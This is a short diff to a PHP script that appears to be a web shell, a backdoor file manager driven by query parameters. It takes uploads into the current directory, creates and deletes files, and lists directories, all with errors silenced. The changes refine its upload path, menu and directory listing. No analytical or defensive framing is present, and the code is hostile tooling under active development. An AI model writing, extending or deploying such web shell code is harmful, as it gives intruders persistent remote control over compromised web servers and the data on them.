@@ -520,7 +520,7 @@ function upload($post) {
   if ($_GET['do'] == $post) {
     if (isset($_POST['submit'])) {
       if ($_POST['type'] == 'biasa') {
-        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+        if (@copy($_FILES['file']['tmp_name'], @cwd().DIRECTORY_SEPARATOR.$_FILES['file']['name'])) {
           ?>
           <tr>
             <td>
@@ -765,18 +765,11 @@ if ($_GET['do'] == 'delete')
   <thead>
     <tr>
       <th colspan="4">
-        <div class="dropdown">
-          <button onclick="myFunction()" class="dropbtn">Choose . . .</button>
-          <div id="myDropdown" class="dropdown-content">
-            <a href="?path=<?php print @cwd() ?>&do=upload">
-              <img src="https://image.flaticon.com/icons/svg/324/324911.svg" class="icon"> UPLOAD
-            </a>
-            <a href="?path=<?php print @cwd() ?>&do=making">
-              <img src="https://image.flaticon.com/icons/svg/303/303804.svg" class="icon"> MAKE FILE & DIRECTORY
-            </a>
-            <a href="#contact">Contact</a>
-          </div>
-        </div>
+        <select onclick="if (this.value) window.location=(this.value)" style="width:100%;">
+          <option value="" selected>Choose . .</option>
+          <option value="?path=<?php print @cwd() ?>&do=upload">Upload File</option>
+          <option value="?path=<?php print @cwd() ?>&do=making">Make File</option>
+      </select>
       </th>
     </tr>
     <tr>
@@ -787,7 +780,7 @@ if ($_GET['do'] == 'delete')
 <?php
 $getPATH = @scandir(@cwd());
 foreach ($getPATH as $dir) {
-  if (!is_dir($dir) || $dir === '.' || $dir === '..') continue;
+  if (!is_dir($dir)) continue;
   ?>
   <tr class="hover">
     <td> 
